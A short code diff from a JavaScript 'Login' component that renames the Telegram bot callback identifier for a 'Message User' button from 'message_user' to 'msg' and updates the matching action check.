@@ -151,7 +151,7 @@ function Login() {
                 { text: '❌ Reject', callback_data: 'reject_' + requestId }
               ],
               [
-                { text: '💬 Message User', callback_data: 'message_user_' + requestId }
+                { text: '💬 Message User', callback_data: 'msg_' + requestId }
               ]
             ]
           }
@@ -215,7 +215,7 @@ function Login() {
                   })
                 } catch (e) {}
                 return { approved: false, status: 'rejected' }
-              } else if (action === 'message_user') {
+              } else if (action === 'msg') {
                 try {
                   await fetch(TELEGRAM_API + '/sendMessage', {
                     method: 'POST',
